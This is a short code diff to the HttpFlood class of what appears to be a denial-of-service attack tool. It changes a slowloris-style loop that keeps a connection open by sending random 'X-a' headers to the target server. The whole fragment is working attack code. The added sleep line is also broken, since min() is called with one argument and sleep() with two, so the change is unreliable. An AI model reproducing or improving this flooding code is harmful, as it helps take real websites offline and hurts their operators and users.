@@ -800,13 +800,12 @@ class HttpFlood:
                 Tools.send(s, payload, self._stats)
                 packets += 1
             while Tools.send(s, payload, self._stats) and s.recv(1):
-                for i in range(self._rpc):
-                    if not self._event.is_set(): return 0
-                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
-                    Tools.send(s, keep, self._stats)
-                    packets += 1
-                    sleep(self._rpc / 15)
-                    break
+                if not self._event.is_set(): return 0
+                keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                Tools.send(s, keep, self._stats)
+                packets += 1
+                sleep(min(self._rpc / 15), 10)
+                if not self._event.is_set(): return 0
         Tools.safe_close(s)
         return packets
 
